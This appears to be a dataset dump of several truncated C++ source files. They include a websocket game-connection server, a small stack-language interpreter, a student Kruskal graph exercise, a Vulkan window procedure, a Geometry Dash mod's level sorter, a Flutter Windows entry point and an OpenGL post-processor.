_interface->versionMinor, _interface->_name.c_str());\r\n\tstd::string message = buffer;\r\n\r\n\tfprintf(stderr, \"%s\\n\", buffer);\r\n\r\n\tif(_interface->_workingDirectory.empty() == false)\r\n\t{\r\n\t\tfprintf(stderr, \"%s\\n\", _interface->_workingDirectory.string().c_str());\r\n\t}\r\n\r\n\tfor (auto& item : _allConnections)\r\n\t{\r\n\t\tauto agent = item.lock();\r\n\r\n\t\tif (agent)\r\n\t\t{\r\n\t\t\tagent->sendUtf8Text(message);\r\n\t\t}\r\n\t}\r\n}\r\n\r\n\r\nvoid WebsocketServer::OnGameClosed(SharedMemoryInterface* _interface)\r\n{\r\n\tm_localServer->OnGameClosed(_interface);\r\n\r\n\tstd::lock_guard lock(_mutex);\r\n\tassert(this->_interface == _interface);\r\n\tthis->_interface = nullptr;\r\n\r\n\tchar buffer[256];\r\n\tsnprintf(buffer, sizeof(buffer), \"%s %s %d.%d %s\", \"OnGameClosed\", _interface->_engine.c_str(), _interface->versionMajor, _interface->versionMinor, _interface->_name.c_str());\r\n\tstd::string message = buffer;\r\n\r\n\tfprintf(stderr, \"%s\\n\", buffer);\r\n\r\n\tfor (auto & item : _allConnections)\r\n\t{\r\n\t\tauto agent = item.lock();\r\n\r\n\t\tif (agent)\r\n\t\t{\r\n\t\t\tagent->sendUtf8Text(message);\r\n\t\t}\r\n\t}\r\n\r\n\r\n\tfor(auto i = 0u; i < _clients.size(); ++i)\r\n\t{\r\n\t\tif(_clients[i].isGameConnection)\r\n\t\t{\r\n\t\t\t_clients.erase(_clients.begin()+i);\r\n\t\t\t--i;\r\n\t\t}\r\n\t}\r\n}\r\n\r\nvoid WebsocketServer::CloseUnaffiliatedClients()\r\n{\r\n\tif(portClosed.exchange(false) == false)\r\n\t\treturn;\r\n\r\n\tstd::lock_guard lock(_mutex);\r\n\r\n\tfor(auto i = 0u; i < _clients.size(); ++i)\r\n\t{\r\n\t\tif(_clients[i].parent.use_count() == 0)\r\n\t\t{\r\n\t\t\t_clients.erase(_clients.begin()+i);\r\n\t\t\t--i;\r\n\t\t}\r\n\t}\r\n\r\n\tfor (auto ptr = socketsByProtocol.begin(); ptr != socketsByProtocol.end(); )\r\n\t{\r\n\t\tauto next = ptr; ++next;\r\n\t\tauto agent = ptr->second.lock();\r\n\r\n\t\tif(ptr->second.use_count() == 0)\r\n\t\t{\r\n\t\t\tsocketsByProtocol.erase(ptr);\r\n\t\t}\r\n\r\n\t\tptr = next;\r\n\t}\r\n\r\n\tfor (auto i = 0u; i < _allConnections.size(); ++i)\r\n\t{\r\n\t\tif (_allConnections[i].use_count() == 0)\r\n\t\t{\r\n\t\t\t_allConnections.erase(_allConnections.begin()+i);\r\n\t\t\t--i;\r\n\t\t}\r\n\t}\r\n}\r\n\r\nvoid WebsocketServer::OnConnection(std::weak_ptr<ix::WebSocket> webSocket, std::shared_ptr<ix::ConnectionState> connectionState)\r\n{\r\n\tauto agent = webSocket.lock();\r\n\tstd::string remote_ip = connectionState->getRemoteIp();\r\n\r\n\tif (!agent) return;\r\n\r\n\tif (m_tls != nullptr)\r\n\t\tagent->setTLSOptions(*m_tls);\r\n\r\n\tif (!m_tls->isValid())\r\n\t{\r\n\t\tfprintf(stderr, \"TLS configuration is not valid: %s\", m_tls->getErrorMsg().c_str());\r\n\t}\r\n\r\n\tif (IsPrivateIp(remote_ip) == ConnectionType::PublicNetwork)\r\n\t{\r\n\t\tfprintf(stderr, \"Connection from \\\"%s\\\", not allowed: clients must be in private IP range. (because client traffic is unecrypted).\", connectionState->getRemoteIp().c_str());\r\n\t\tagent->close();\r\n\t\treturn;\r\n\t}\r\n\r\n\tagent->setOnMessageCallback(std::bind(&WebsocketServer::OnMessageCallback, this, webSocket, std::placeholders::_1));\r\n\t\r\n\tstd::lock_guard lock(_mutex);\r\n\tfor (auto& item : agent->getSubProtocols())\r\n\t{\r\n\t\tsocketsByProtocol.insert({ item, webSocket });\r\n\t}\r\n}\r\n\r\nvoid WebsocketServer::OnMessageCallback(std::weak_ptr<ix::WebSocket> webSocket, const ix::WebSocketMessageP",
    "#include \"stktb.hpp\"\n#include \"lib.hpp\"\n#include <cstdint>\n#include <ostream>\n#include <cstdlib>\n#include <list>\n#include <string>\n#include <regex>\n#include <vector>\n#include <cmath>\n#include <boost/dll/shared_library.hpp>\n#include <boost/function.hpp>\n\nusing stktb::Token;\n\nint main(int argc, char* argv[])\n{\n    if (argc != 3)\n    {\n        std::cerr << \"Invalid command argument.\\n\";\n        return EXIT_FAILURE;\n    }\n\n    auto src = stktb::getvalue<std::vector<std::uint8_t>>(argv[1]);\n    auto constants = stktb::getvalue<std::list<std::string>>(argv[2]);\n\n    stktb::envs env;\n    env.inblock.push(true);\n    std::regex str(\"\\\".*\\\"\"), intre(\"[+-]?\\\\d+\"), num(\"[+-]?\\\\d+(?:\\\\.\\\\d+)?\"), comment(\"#.*\");\n    for (std::size_t i = 0; i<src.size(); i++)\n    {\n        std::uint8_t line;\n        try\n        {\n            line = src.at(i);\n        }\n        catch (const std::exception& e)\n        {\n            stktb::err(i, \"main-process\", e.what());\n        }\n\n        if (line == Token::ENDIF)\n        {\n            try\n            {\n                env.inblock.pop();\n            }\n            catch (const std::exception& e)\n            {\n                stktb::err(i, \"ENDIF\", e.what());\n            }\n        }\n        else if (line == Token::ENDDEF)\n        {\n            env.insub = false;\n            if (env.current != 0)\n            {\n                i = env.current;\n            }\n        }\n        else if (!env.inblock.top())\n        {\n            continue;\n        }\n        else if (env.insub)\n        {\n            continue;\n        }\n        \n        if (line == Token::PUSH)\n        {\n            std::string s = constants.front();\n            constants.pop_front();\n            stktb::token_t t;\n            if (std::regex_match(s, str))\n            {\n                env.stack.push(s.substr(1, s.length()-2));\n            }\n            else if (std::regex_match(s, num))\n            {\n                env.stack.push(std::stod(s));\n            }\n            else if (std::regex_match(s, intre))\n            {\n                env.stack.push(std::int64_t(std::stoi(s)));\n            }\n            else\n            {\n                stktb::err(i, \"PUSH\", \"Invalid constant group value.\");\n            }\n        }\n        else if (line == Token::STORE)\n        {\n            stktb::token_t name = stktb::get(env), value = stktb::get(env);\n            if (std::holds_alternative<std::string>(name))\n            {\n                env.vars.insert_or_assign(std::get<std::string>(name), value);\n            }\n            else \n            {\n                stktb::err(i, \"STORE\", \"The name of the variable must be a string.\");\n            }\n        }\n        else if (line == Token::LOAD)\n        {\n            stktb::token_t name = stktb::get(env);\n            if (std::holds_alternative<std::string>(name))\n            {\n                try\n                {\n                    env.stack.push(env.vars.at(std::get<std::string>(name)));\n                }\n                catch (const std::exception& e)\n                {\n                    stktb::err(i, \"LOAD\", e.what());\n                }\n            }\n            else\n            {\n                stktb::err(i, \"LOAD\", \"The name of the variable must be a string.\");\n            }\n        }\n        else if (line == Token::ERASE)\n        {\n            stktb::token_t name = stktb::get(env);\n            if (std::holds_alternative<std::string>(name))\n            {\n                env.vars.erase(std::get<std::string>(name));\n            }\n            else\n            {\n                stktb::err(i, \"ERASE\", \"The name of the variable must be a string.\");\n            }\n        }\n        else if (line == Token::DEF)\n        {\n            stktb::token_t name = stktb::get(env);\n            if (std::holds_alternative<std::string>(name))\n            {\n                env.insub = true;\n                std::string name_s = std::get<std::string>(name);\n                env.subs.insert_or_assign(name_s, i);\n            }\n            else\n            {\n                stktb::err(i, \"DEF\", \"The name of the function must be a string.\");\n            }\n        }\n        else if (line == Token::CALL)\n        {\n            stktb::token_t name = stktb::get(env);\n            if (std::holds_alternative<std::string>(name))\n            {\n                try\n                {\n                    env.current = i;\n                    i = env.subs.at(std::get<std::string>(name));\n                }\n                catch (const std::exception& e)\n                {\n                    stktb::err(i, \"CALL\", e.what());\n                }\n            }\n            else\n            {\n                stktb::err(i, \"CALL\", \"The name of the function must be a string.\");\n            }\n        }\n        else if (line == Token::DEBUG)\n        {\n            stktb::token_t t = stktb::get(env);\n            std::visit([](const auto& res){\n                std::cout << res << \"\\n\";\n            }, t);\n        }\n        else if (line == Token::IMPOR",
    "#include<string>\r\n#include<stdio.h>\r\n#include<iostream>\r\n#include<stack>\r\n#include<bits/stdc++.h>\r\nusing namespace std;\r\n#define n 99\r\n\r\n\r\nclass Matrix{\r\n\tpublic :\r\n\t\tint edge=0;\r\n\t\tint sum=0;\r\n\t\tint v=7;\r\n\t\tint Kraskal(int matrix[7][7]);\r\n};\r\n\r\n\r\n\r\n\r\nint Matrix::Kraskal(int matrix[7][7]){\r\n\r\nint arr[7]={0,0,0,0,0,0,0};\r\nwhile(edge!=v-1)\r\n{\r\n\tint min=n;\r\n\tint ptr_i,ptr_j;\r\n\tfor(int i=0;i<v;i++)\r\n\t{\r\n\t\tfor(int j=i;j<v;j++)\r\n\t\t{\r\n\t\t\tif(matrix[i][j]<min && matrix[i][j] != 0)\r\n\t\t\t{\r\n\t\t\t\tif(arr[i] ==1 && arr[j] ==1)\r\n\t\t\t\t{\r\n\t\t\t\t\tcontinue;\r\n\t\t\t\t}\r\n\t\t\t\telse{\r\n\t\t\t\t\tmin=matrix[i][j];\r\n\t\t\t\t\tptr_i=i;\r\n\t\t\t\t\tptr_j=j;\t\t\t\t\r\n\t\t\t\t}\r\n\t\t\t}\r\n\t\t}\r\n\t}\t\r\n\tsum=sum+min;\r\n\tarr[ptr_i]=1;\r\n\tcout<<\"\\n\"<<ptr_i+1<<\"<->\"<<ptr_j+1<<\"   \"<<min;\r\n\tarr[ptr_j]=1;\r\n\tedge++;\r\n}\r\n\r\nreturn sum;\r\n}\r\n\r\n\r\n\r\nint main(){\r\n\tcout<<\"start\";\r\n\tMatrix M;\r\n\tint matrix[7][7]={\r\n// j 0\t  1    2\t3\t 4\r\n\t{0  , 2  , 2  , 0  , 0 , 0 , 0},\r\n\t{2  , 0  , 1  , 2  , 4 , 0 , 0},\r\n\t{2  , 1  , 0  , 3  , 0 , 4 , 0},\r\n\t{0  , 2  , 3  , 0  , 2 , 3 , 0},\r\n\t{0  , 4  , 0  , 2  , 0 , 2 , 3},\r\n\t{0  , 0  , 4  , 3  , 2 , 0 , 3},\r\n\t{0  , 0  , 0  , 0  , 3 , 3 , 0}\r\n\t};\r\n\tM.Kraskal(matrix);\r\n\tcout<<\"\\n sum =\"<<M.sum;\r\nreturn 0;\r\n}\r\n\r\n// kraskal done\r\n// not verified by jdb sir \r\n// working\r\n",
    "#include \"VulkApp.h\"\n\nLRESULT CALLBACK\nMainWndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)\n{\n\t// Forward hwnd on because we can get messages (e.g., WM_CREATE)\n\t// before CreateWindow returns, and thus before mhMainWnd is valid.\n\treturn VulkApp::GetApp()->MsgProc(hwnd, msg, wParam, lParam);\n}\n\nVulkApp* VulkApp::mApp = nullptr;\nVulkApp* VulkApp::GetApp()\n{\n\treturn mApp;\n}\n\nVulkApp::VulkApp(HINSTANCE hInstance)\n\t: mhAppInst(hInstance)\n{\n\t// Only one D3DApp can be constructed.\n\tassert(mApp == nullptr);\n\tmApp = this;\n}\n\nVulkApp::~VulkApp()\n{\n\tcleanupVulkan();\n}\n\nHINSTANCE VulkApp::AppInst()const\n{\n\treturn mhAppInst;\n}\n\nHWND VulkApp::MainWnd()const\n{\n\treturn mhMainWnd;\n}\n\nfloat VulkApp::AspectRatio()const\n{\n\treturn static_cast<float>(mClientWidth) / mClientHeight;\n}\n\nint VulkApp::Run()\n{\n\tMSG msg = { 0 };\n\n\tmTimer.Reset();\n\n\twhile (msg.message != WM_QUIT)\n\t{\n\t\t// If there are Window messages then process them.\n\t\tif (PeekMessage(&msg, 0, 0, 0, PM_REMOVE))\n\t\t{\n\t\t\tTranslateMessage(&msg);\n\t\t\tDispatchMessage(&msg);\n\t\t}\n\t\t// Otherwise, do animation/game stuff.\n\t\telse\n\t\t{\n\t\t\tmTimer.Tick();\n\n\t\t\tif (!mAppPaused)\n\t\t\t{\n\t\t\t\tCalculateFrameStats();\n\t\t\t\tUpdate(mTimer);\n\t\t\t\tDraw(mTimer);\n\t\t\t}\n\t\t\telse\n\t\t\t{\n\t\t\t\tSleep(100);\n\t\t\t}\n\t\t}\n\t}\n\tvkDeviceWaitIdle(mDevice);\n\treturn (int)msg.wParam;\n}\n\n\n\nbool VulkApp::Initialize()\n{\n\n\tif (!InitMainWindow())\n\t\treturn false;\n\n\tif (!InitVulkan())\n\t\treturn false;\n\n\t// Do the initial resize code.\n\tOnResize();\n\n\treturn true;\n}\n\n\nvoid VulkApp::OnResize()\n{\n\tvkDeviceWaitIdle(mDevice);\n\tDestroySwapchain();\n\tCreateSwapchain();\n}\n\n\nLRESULT VulkApp::MsgProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)\n{\n\tswitch (msg)\n\t{\n\t\t// WM_ACTIVATE is sent when the window is activated or deactivated.  \n\t\t// We pause the game when the window is deactivated and unpause it \n\t\t// when it becomes active.  \n\tcase WM_ACTIVATE:\n\t\tif (LOWORD(wParam) == WA_INACTIVE)\n\t\t{\n\t\t\tmAppPaused = true;\n\t\t\tmTimer.Stop();\n\t\t}\n\t\telse\n\t\t{\n\t\t\tmAppPaused = false;\n\t\t\tmTimer.Start();\n\t\t}\n\t\treturn 0;\n\n\t\t// WM_SIZE is sent when the user resizes the window.  \n\tcase WM_SIZE:\n\t\t// Save the new client area dimensions.\n\t\tmClientWidth = LOWORD(lParam);\n\t\tmClientHeight = HIWORD(lParam);\n\t\tif (mDevice != VK_NULL_HANDLE)\n\t\t{\n\t\t\tif (wParam == SIZE_MINIMIZED)\n\t\t\t{\n\t\t\t\tmAppPaused = true;\n\t\t\t\tmMinimized = true;\n\t\t\t\tmMaximized = false;\n\t\t\t}\n\t\t\telse if (wParam == SIZE_MAXIMIZED)\n\t\t\t{\n\t\t\t\tmAppPaused = false;\n\t\t\t\tmMinimized = false;\n\t\t\t\tmMaximized = true;\n\t\t\t\tOnResize();\n\t\t\t}\n\t\t\telse if (wParam == SIZE_RESTORED)\n\t\t\t{\n\n\t\t\t\t// Restoring from minimized state?\n\t\t\t\tif (mMinimized)\n\t\t\t\t{\n\t\t\t\t\tmAppPaused = false;\n\t\t\t\t\tmMinimized = false;\n\t\t\t\t\tOnResize();\n\t\t\t\t}\n\n\t\t\t\t// Restoring from maximized state?\n\t\t\t\telse if (mMaximized)\n\t\t\t\t{\n\t\t\t\t\tmAppPaused = false;\n\t\t\t\t\tmMaximized = false;\n\t\t\t\t\tOnResize();\n\t\t\t\t}\n\t\t\t\telse if (mResizing)\n\t\t\t\t{\n\t\t\t\t\t// If user is dragging the resize bars, we do not resize \n\t\t\t\t\t// the buffers here because as the user continuously \n\t\t\t\t\t// drags the resize bars, a stream of WM_SIZE messages are\n\t\t\t\t\t// sent to the window, and it would be pointless (and slow)\n\t\t\t\t\t// to resize for each WM_SIZE message received from dragging\n\t\t\t\t\t// the resize bars.  So instead, we reset after the user is \n\t\t\t\t\t// done resizing the window and releases the resize bars, which \n\t\t\t\t\t// sends a WM_EXITSIZEMOVE message.\n\t\t\t\t}\n\t\t\t\telse // API call such as SetWindowPos or mSwapChain->SetFullscreenState.\n\t\t\t\t{\n\t\t\t\t\tOnResize();\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t\treturn 0;\n\n\t\t// WM_EXITSIZEMOVE is sent when the user grabs the resize bars.\n\tcase WM_ENTERSIZEMOVE:\n\t\tmAppPaused = true;\n\t\tmResizing = true;\n\t\tmTimer.Stop();\n\t\treturn 0;\n\n\t\t// WM_EXITSIZEMOVE is sent when the user releases the resize bars.\n\t\t// Here we reset everything based on the new window dimensions.\n\tcase WM_EXITSIZEMOVE:\n\t\tmAppPaused = false;\n\t\tmResizing = false;\n\t\tmTimer.Start();\n\t\tOnResize();\n\t\treturn 0;\n\n\t\t// WM_DESTROY is sent when the window is being destroyed.\n\tcase WM_DESTROY:\n\t\tPostQuitMessage(0);\n\t\treturn 0;\n\n\t\t// The WM_MENUCHAR message is sent when a menu is active and the user presses \n\t\t// a key that does not correspond to any mnemonic or accelerator key. \n\tcase WM_MENUCHAR:\n\t\t// Don't beep when we alt-enter.\n\t\treturn MAKELRESULT(0, MNC_CLOSE);\n\n\t\t// Catch this message so to prevent the window from becoming too small.\n\tcase WM_GETMINMAXINFO:\n\t\t((MINMAXINFO*)lParam)->ptMinTrackSize.x = 200;\n\t\t((MINMAXINFO*)lParam)->ptMinTrackSize.y = 200;\n\t\treturn 0;\n\n\tcase WM_LBUTTONDOWN:\n\tcase WM_MBUTTONDOWN:\n\tcase WM_RBUTTONDOWN:\n\t\tOnMouseDown(wParam, GET_X_LPARAM(lParam), GET_Y_LPARAM(lParam));\n\t\treturn 0;\n\tcase WM_LBUTTONUP:\n\tcase WM_MBUTTONUP:\n\tcase WM_RBUTTONUP:\n\t\tOnMouseUp(wParam, GET_X_LPARAM(lParam), GET_Y_LPARAM(lParam));\n\t\treturn 0;\n\tcase WM_MOUSEMOVE:\n\t\tOnMouseMove(wParam, GET_X_LPARAM(lParam), GET_Y_LPARAM(lParam));\n\t\treturn 0;\n\tcase WM_KEYUP:\n\t\tif (wParam == VK_ESCAPE)\n\t\t{\n\t\t\tPostQuitMessage(0);\n\t\t}\n\t\telse if ((int)wParam == VK_F2)\n\t\t\t//Set4xMsaaState(!m4xMsaaState);\n\n\t\t\treturn 0;\n\t}\n\n\treturn DefWindowProc",
    "#include \"Geode/Enums.hpp\"\n#include \"Geode/binding/ButtonSprite.hpp\"\n#include \"Geode/binding/CCMenuItemSpriteExtra.hpp\"\n#include \"Geode/binding/CCMenuItemToggler.hpp\"\n#include \"Geode/binding/GJDifficultySprite.hpp\"\n#include \"Geode/binding/GJGameLevel.hpp\"\n#include \"Geode/binding/GJLevelList.hpp\"\n#include \"Geode/binding/LevelListLayer.hpp\"\n#include \"Geode/cocos/base_nodes/Layout.hpp\"\n#include \"Geode/cocos/cocoa/CCObject.h\"\n#include \"Geode/cocos/label_nodes/CCLabelBMFont.h\"\n#include \"Geode/ui/BasedButtonSprite.hpp\"\n#include \"Geode/utils/cocos.hpp\"\n#include \"Geode/utils/string.hpp\"\n#include <Geode/modify/LevelListLayer.hpp>\n#include <span>\n\nusing namespace cocos2d;\n\nusing namespace geode::log;\nusing geode::cocos::CCArrayExt;\n\nenum class Method\n{\n\tStars,\n\tId,\n\tLevelName,\n\tAuthorName,\n\tRating,\n\tLast = Rating\n};\n\nconst char* getMethodBtnStr(Method e)\n{\n\tswitch(e)\n\t{\n        case Method::Stars: return \"Stars\";\n        case Method::Id: return \"ID\";\n\t\tcase Method::LevelName: return \"Level Name\";\n\t\tcase Method::AuthorName: return \"Author Name\";\n\t\tcase Method::Rating: return \"Featured\";\n    }\n}\n\nenum class LevelRating\n{\n\tNone, StarOnly, Featured, Epic, Legendary, Mythic\n};\n\nLevelRating getRating(GJGameLevel* level)\n{\n\tswitch(level->m_isEpic)\n\t{\n\t\tcase 1: return LevelRating::Epic;\n\t\tcase 2: return LevelRating::Legendary;\n\t\tcase 3: return LevelRating::Mythic;\n\t\tdefault: break;\n\t}\n\tif(level->m_featured != 0) return LevelRating::Featured;\n\tif(level->m_stars.value() != 0) return LevelRating::StarOnly;\n\treturn LevelRating::None;\n}\n\nint getDiffSpriteAverage(GJGameLevel* level)\n{\n\tif(level->m_demon.value() == 1)\n\t{\n\t\tswitch(level->m_demonDifficulty)\n\t\t{\n\t\t\tcase 3: return 7;\n\t\t\tcase 4: return 8;\n\t\t\tcase 5: return 9;\n\t\t\tcase 6: return 10;\n\t\t\tdefault: return  6;\n\t\t}\n\t}\n\tif(level->m_autoLevel)\n\t{\n\t\treturn -1;\n\t}\n\treturn level->getAverageDifficulty();\n}\n\nstruct Sorter\n{\n\tvirtual bool canSplit() { return false; }\n\tvirtual std::vector<std::span<int>> split(const gd::vector<int>&) { return {}; }\n\t//virtual void sort(gd::vector<int>&);\n\n\tvirtual bool operator_lt(GJGameLevel* left, GJGameLevel* right) = 0;\n};\n\n\nstruct SortById : Sorter\n{\n\tvirtual bool operator_lt(GJGameLevel* left, GJGameLevel* right)\n\t{\n\t\treturn left->m_levelID.value() < right->m_levelID.value();\n\t}\n};\n\nstruct SortByStars : Sorter\n{\n\tint getFixedDemonInt(GJGameLevel* level)\n\t{\n\t\tswitch(level->m_demonDifficulty)\n\t\t{\n\t\t\tcase 3: return 1;\n\t\t\tcase 4: return 2;\n\t\t\tcase 5: return 9;\n\t\t\tcase 6: return 10;\n\t\t\tdefault: return 6;\n\t\t}\n\t}\n\tvirtual bool operator_lt(GJGameLevel* left, GJGameLevel* right)\n\t{\n\t\tint lstars = left->m_stars.value();\n\t\tint rstars = right->m_stars.value();\n\n\t\tif(lstars == 10 && rstars == 10)\n\t\t{\n\t\t\tint ld = getFixedDemonInt(left);\n\t\t\tint rd = getFixedDemonInt(right);\n\t\t\tif(ld != rd) return ld < rd;\n\t\t}\n\n\t\tif(lstars == rstars)\n\t\t{\n\t\t\treturn getRating(left) < getRating(right);\n\t\t}\n\n\t\treturn lstars < rstars;\n\t}\n};\n\nstruct SortByLevelName : Sorter\n{\n\tvirtual bool operator_lt(GJGameLevel* left, GJGameLevel* right)\n\t{\n\t\tusing namespace geode::utils::string;\n\t\treturn toLower(left->m_levelName) < toLower(right->m_levelName);\n\t}\n};\n\nstruct SortByAuthorName : Sorter\n{\n\tvirtual bool operator_lt(GJGameLevel* left, GJGameLevel* right)\n\t{\n\t\tusing namespace geode::utils::string;\n\t\treturn toLower(left->m_creatorName) < toLower(right->m_creatorName);\n\t}\n};\n\nSorter* getSorter(Method method);\n\nstruct SortByRating : Sorter\n{\n\n\n\tvirtual bool operator_lt(GJGameLevel* left, GJGameLevel* right)\n\t{\n\t\tauto lr = getRating(left);\n\t\tauto rr = getRating(right);\n\t\tif(lr == rr)\n\t\t{\n\t\t\treturn getSorter(Method::Stars)->operator_lt(left, right);\n\t\t}\n\t\treturn lr < rr;\n\t}\n};\n\nSorter* getSorter(Method method)\n{\n\tstatic SortById id;\n\tstatic SortByLevelName name;\n\tstatic SortByStars stars;\n\tstatic SortByAuthorName author;\n\tstatic SortByRating rating;\n\n\tswitch(method)\n\t{\n    \tcase Method::Stars: return &stars;\n    \tcase Method::Id: return &id;\n    \tcase Method::LevelName: return &name;\n        case Method::AuthorName: return &author;\n        case Method::Rating: return &rating;\n          break;\n        }\n}\n\nGJFeatureState getFeatureState(LevelRating r)\n{\n\tswitch(r)\n\t{\n        case LevelRating::None: return GJFeatureState::None;\n        case LevelRating::StarOnly: return GJFeatureState::None;\n        case LevelRating::Featured: return GJFeatureState::Featured;\n        case LevelRating::Epic: return GJFeatureState::Epic;\n        case LevelRating::Legendary: return GJFeatureState::Legendary;\n        case LevelRating::Mythic: return GJFeatureState::Mythic;\n    }\n}\n\n\nstruct ChooseSortLayer : public geode::Popup<LevelListLayer*>\n{\n\tLevelListLayer* listlayer = nullptr;\n\tstd::vector<GJGameLevel*> newOrder;\n\tCCMenuItemToggler* activeSorter = nullptr;\n\tCCNode* previewNode = nullptr;\n\n\tvoid sortList(Sorter* sorter)\n\t{\n\t\tif(newOrder.empty())\n\t\t{\n\t\t\tauto& list = listlayer->m_levelList;\n\t\t\tauto levels = CCArrayExt<GJGameLevel*>(list->getListLevelsArray(nullptr));\n\t\t\tstd::copy(levels.begin(), levels.end(), std",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"myprojctapp\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"post_processor.h\"\n\n#include <iostream>\n\nPostProcessor::PostProcessor(Shader shader, unsigned int width, unsigned int height)\n    : PostProcessingShader(shader), Texture(), Width(width), Height(height), Confuse(false), Chaos(false), Shake(false), Grayscale(false) {\n    glGenFramebuffers(1, &this->MSFBO);\n    glGenFramebuffers(1, &this->FBO);\n    glGenRenderbuffers(1, &this->RBO);\n\n    // initialize rbo storage with a MS color buffer (don't need a depth/stencil buffer)\n    // bind MS FBO\n    glBindFramebuffer(GL_FRAMEBUFFER, this->MSFBO);\n    glBindRenderbuffer(GL_RENDERBUFFER, this->RBO);\n\n    // MSFBO: for anti aliasing\n    glRenderbufferStorageMultisample(GL_RENDERBUFFER, 4, GL_RGB, width, height); // allocate storage for render buffer object\n    glFramebufferRenderbuffer(GL_FRAMEBUFFER, GL_COLOR_ATTACHMENT0, GL_RENDERBUFFER, this->RBO); // attach MS RBO to framebuffer\n\n    if(glCheckFramebufferStatus(GL_FRAMEBUFFER) != GL_FRAMEBUFFER_COMPLETE)\n        std::cout << \"ERROR::POSTPROCESSOR: Failed to initialize MSFBO\" << std::endl;\n\n    // Post processing effects\n    glBindFramebuffer(GL_FRAMEBUFFER, this->FBO);\n    this->Texture.Generate(width, height, NULL);\n\n    // Use `this->Texture` as color attachment for `this->FBO`\n    glFramebufferTexture2D(GL_FRAMEBUFFER, GL_COLOR_ATTACHMENT0, GL_TEXTURE_2D, this->Texture.ID, 0); // attach texture to framebuffer as its color attachment\n    \n    if(glCheckFramebufferStatus(GL_FRAMEBUFFER) != GL_FRAMEBUFFER_COMPLETE)\n        std::cout << \"ERROR::POSTPROCESSOR: Failed to initialize FBO\" << std::endl;\n\n    // Setup screen rendering data\n    glBindFramebuffer(GL_FRAMEBUFFER, 0);\n\n    this->initRenderData();\n    this->PostProcessingShader.SetInteger(\"scene\", 0, true);\n    float offset = 1.0f / 300.0f;\n    \n    float offsets[9][2] = {\n        { -offset, offset }, // top left\n        { 0.0f, offset }, // top center\n        { offset, offset }, // top right\n        { -offset, 0.0f }, // center left\n        { 0.0f, 0.0f }, // center-center\n        { offset, 0.0f }, // center right\n        { -offset, -offset }, // bottom left\n        { -offset, 0.0f }, // bottom center\n        { -offset, offset }, // bottom right\n    };\n\n    // highlight edges\n    glUniform2fv(glGetUniformLocation(this->PostProcessingShader.ID, \"offsets\"), 9, (float*)offsets);\n    int edge_kernel[9] = {\n        -1, -1, -1,\n        -1,  8, -1,\n        -1, -1, -1\n    };\n    \n    glUniform1iv(glGetUniformLocation(this->PostProcessingShader.ID, \"edge_kernel\"), 9, edge_kernel);\n    float blur_kernel[9] = {\n        1.0f / 16.0f, 2.0f / 16.0f, 1.0f / 16.0f,\n        2.0f / 16.0f, 4.0f / 16.0f, 2.0f / 16.0f,\n        1.0f / 16.0f, 2.0f / 16.0f, 1.0f / 16.0f\n    };\n    \n    glUniform1fv(glGetUniformLocation(this->PostProcessingShader.ID, \"blur_kernel\"), 9, blur_kernel);\n}\n\nvoid PostProcessor::BeginRender() {\n    // render scene to MS FBO\n    glBindFramebuffer(GL_FRAMEBUFFER, this->MSFBO);\n    glClearColor(0.0f, 0.0f, 0.0f, 1.0f);\n    glClear(GL_COLOR_BUFFER_BIT);\n}\n\nvoid PostProcessor::EndRender() {\n    // copy MS FBO to FBO (only color buffer)\n    glBindFramebuffer(GL_READ_FRAMEBUFFER, this->MSFBO);\n    glBindFramebuffer(GL_DRAW_FRAMEBUFFER, this->FBO);\n    \n    // masks for blit:  The bitwise OR of the flags indicating which buffers are to be copied. The allowed flags are GL_COLOR_BUFFER_BIT, GL_DEPTH_BUFFER_BIT and GL_STENCIL_BUFFER_BIT. \n    glBlitFramebuffer(0, 0, this->Width, this->Height, 0, 0, this->Width, this->Height, GL_COLOR_BUFFER_BIT, GL_NEAREST);\n    // binds both READ and WRITE framebuffer to default framebuffer\n    glBindFramebuffer(GL_FRAMEBUFFER, 0); \n}\n\nvoid PostProcessor::Render(float time) {\n    // set uniforms / options\n    this->PostProcessingShader.Use();\n    this->PostProcessingShader.SetFloat(\"time\", time);\n    this->PostProcessingShader.SetInteger(\"confuse\", this->Confuse);\n    this->PostProcessingShader.SetInteger(\"chaos\", this->Chaos);\n    this->PostProcessingShader.SetInteger(\"shake\", this->Shake);\n    this->PostProcessingShader.SetInteger(\"grayscale\", this->Grayscale);\n\n    // render screen quad with the color texture\n    glActiveTexture(GL_TEXTURE0);\n    this->Texture.Bind(); // use the color attachment of `this->FBO`\n    glBindVertexArray(this->VAO);\n    glDrawArrays(GL_TRIANGLES, 0, 6);\n    glBindVertexArray(0);\n}\n\nvoid PostProcessor::initRenderData() {\n    // configure VAO/VBO for screen quad\n    unsigned int VBO;\n    float vertices[] = {\n        // pos        // tex\n        -1.0f, -1.0f, 0.0f, 0.0f,\n         1.0f,  1.0f, 1.0f, 1.0f,\n        -1.0f,  1.0f, 0.0f, 1.0f,\n\n        -1.0f, -1.0f, 0.0f, 0.0f,\n         1.0f, -1.0f, 1.0f, 0.0f,\n         1.0f,  1.0f, 1.0f, 1.0f\n    };\n\n    glGenVertexArrays(1, &this->VAO);\n    glGenBuffers(1, &VBO);\n\n    